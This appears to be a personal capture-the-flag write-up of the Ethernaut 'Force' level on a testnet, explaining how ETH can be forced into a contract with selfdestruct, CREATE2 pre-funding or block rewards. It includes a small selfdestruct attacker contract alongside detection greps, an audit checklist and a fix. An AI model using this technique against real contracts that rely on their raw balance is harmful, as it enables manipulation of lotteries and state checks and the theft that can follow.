// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }

  # Ethernaut — Level 7: Force

**Network:** Sepolia testnet  
**Contract:** `0xcD39B5ef37bdE74c21f3c01F2316cdB40377F6EA`  
**Date completed:** June 2026

---

## What the challenge was

Make the balance of the Force contract greater than 0.  
The contract had no `payable` functions, no `receive()`, and no `fallback()` — seemingly no way to send it ETH.

---

## What confused me

- It looked impossible — the contract literally had no way to accept ETH
- Didn't know that `selfdestruct` bypasses all contract receive logic entirely

---

## Vulnerability involved

**Forced ETH — contracts cannot refuse ETH sent via `selfdestruct`.**

There are three ways to force ETH into a contract that doesn't want it:

### Method 1 — selfdestruct (used here)
When a contract self-destructs, it sends its entire ETH balance to a target address. The target **cannot refuse it** — no function is called, no fallback triggers, the ETH just appears in the balance regardless of whether the contract is payable.

### Method 2 — Pre-sent ETH via CREATE2
`CREATE2` deploys contracts to **deterministic addresses** calculated from:
- The deployer's address
- A salt (any bytes32 value)
- The contract bytecode

This means you can know a contract's address **before it exists**, send ETH there, and the contract is born with a balance it never accepted.

```javascript
// Calculate CREATE2 address with ethers.js
const address = ethers.utils.getCreate2Address(
  deployerAddress,
  salt,
  ethers.utils.keccak256(bytecode)
)
```

### Method 3 — Block rewards / coinbase
Miners and validators can set **any address** as the recipient of block rewards and gas fees. ETH sent this way bypasses all contract logic. Mostly theoretical for attackers (requires running a validator with 32 ETH staked) but important for contract logic assumptions.

---

## How I solved it

**Step 1 — Deployed a self-destructing attacker contract in Remix**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttack {
    constructor() payable {}

    function attack(address payable _target) public {
        selfdestruct(_target);
    }
}
```

**Step 2 — Deployed with 1 wei**  
Environment: Browser Extension (MetaMask), Value: **1 wei**.

**Step 3 — Called `attack()` with the Force contract address**
```
0xcD39B5ef37bdE74c21f3c01F2316cdB40377F6EA
```
The attacker contract self-destructed and sent its 1 wei to the Force contract — which could not refuse it.

**Step 4 — Verified the balance**
```javascript
await getBalance(instance)
// returned a value greater than 0
```

**Step 5 — Submitted the instance** ✅

---

## How to spot this vulnerability in real contracts

**Search for balance-dependent logic:**
```bash
grep -r "address(this).balance" ./contracts/
```

**On Etherscan:**
- `Ctrl+F` search `address(this).balance`
- Any equality check (`==`) on the balance is a red flag
- Greater/less than checks may also be exploitable depending on context

**Dangerous patterns:**

```solidity
// ❌ assumes balance is always zero until someone pays in
require(address(this).balance == 0);

// ❌ uses balance for game/lottery logic
if (address(this).balance == jackpot) {
    winner = msg.sender;
}

// ❌ uses balance as a state check
function isActive() public view returns (bool) {
    return address(this).balance > 0;
}
```

**Spotting CREATE2 risk:**
```bash
grep -r "CREATE2" ./contracts/
grep -r "salt:" ./contracts/
```
If a contract assumes `address(this).balance == 0` at construction and uses CREATE2 deployment — the balance assumption is broken before the contract even exists.

---

## Real audit checklist

| Pattern | Verdict |
|---|---|
| `require(address(this).balance == 0)` | ❌ Exploitable via selfdestruct |
| Balance used in game/lottery win condition | ❌ Manipulable |
| Balance used as a state flag | ❌ Unreliable |
| Contract deployed via CREATE2 with balance assumptions | ❌ Pre-sendable |
| Balance only used for withdrawal accounting | ✅ Fine if tracked internally |

---

## The fix

Never use `address(this).balance` directly for critical logic. Instead track deposits internally:

```solidity
// ✅ safe — track deposits in a mapping, not raw balance
mapping(address => uint256) public deposits;

function deposit() public payable {
    deposits[msg.sender] += msg.value;
}
```

This way forced ETH doesn't affect your accounting.

---

## Key takeaway

**Never trust `address(this).balance` as a source of truth for contract state.**

ETH can always be forced in via `selfdestruct`, pre-sent via CREATE2, or deposited via block rewards. Any contract that makes decisions based on its exact ETH balance can be manipulated by anyone willing to sacrifice a small amount of ETH.
